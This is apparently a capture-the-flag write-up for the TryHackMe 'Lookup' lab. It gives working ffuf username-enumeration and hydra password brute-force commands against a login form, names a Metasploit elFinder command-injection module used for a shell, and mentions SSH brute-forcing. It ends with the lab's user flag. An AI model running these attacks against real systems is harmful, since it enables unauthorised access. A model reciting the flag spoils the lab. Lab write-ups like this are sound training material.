Room site -> https://tryhackme.com/r/room/lookup

Add lookup.thm to your `/etc/hosts` file
Found that the username is `admin` just by hit and trail.
## We can use Ffuz to enumirate and achieve this
```bash
$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=test' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100
...
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 90ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 132ms]
```
Cracking `admin` doesnt seem easy. meanwhile `jose` password is cracked.
## Password Cracking
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -f
```
Here is the resppnse
`[80][http-post-form] host: lookup.thm   login: jose   password: password123`

After loggig in i observe that there is a redirect to `files.lookup.thm`
Add `files.lookup.thm` to your `/etc/hosts/` file.

## The exploit i have used
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection)
Exploit I have used and got a shell.
```bash
www-data@lookup:/home/think$
```
Since we can see the username `think` and the ssh port is open as well. so i decided to bruteforce the password for ssh. 
And got the passowrd.. `josemario.AKA(think)`

## user.txt
38375fb4dd8baa2b2039ac03d92b820e
